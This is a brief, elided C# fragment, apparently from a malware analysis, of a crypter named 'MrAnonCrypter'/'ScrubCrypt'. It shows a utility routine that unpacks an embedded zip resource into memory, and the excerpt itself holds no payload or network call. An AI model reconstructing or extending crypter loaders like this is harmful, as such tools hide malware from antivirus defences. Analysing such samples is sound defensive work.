...
namespace MrAnonCrypter
{
    internal class Utils
    {
        ...
        {
            using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("ScrubCrypt.Resources.zip"))
            {
                using (ZipArchive zipArchive = new ZipArchive(manifestResourceStream, ZipArchiveMode.Read))
                {
                    foreach (ZipArchiveEntry entry in zipArchive.Entries)
                    {
                        ...
                        using (MemoryStream destination = new MemoryStream())
                        {
                            ...
                            Utils.Resources[entry.Name] = destination.ToArray();
                        }
                    }
                }
            }
